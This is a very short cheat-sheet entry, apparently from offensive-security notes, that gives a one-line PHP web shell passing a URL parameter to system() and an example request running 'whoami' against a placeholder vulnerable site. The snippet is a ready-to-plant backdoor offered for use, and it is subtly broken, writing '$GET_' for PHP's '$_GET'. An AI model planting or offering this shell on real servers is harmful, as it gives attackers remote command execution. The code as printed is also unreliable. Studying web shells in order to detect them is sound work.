---
title: PHP Webshell
desc: Examples of PHP webshell.
tags: [ReverseShell, Web]
alts: []
website:
render_with_liquid: false
---

```sh
<?php system($GET_['cmd']); ?>

# ----------------------------------------------------

Access to https://vulnerable.com/index.php?cmd=whoami
```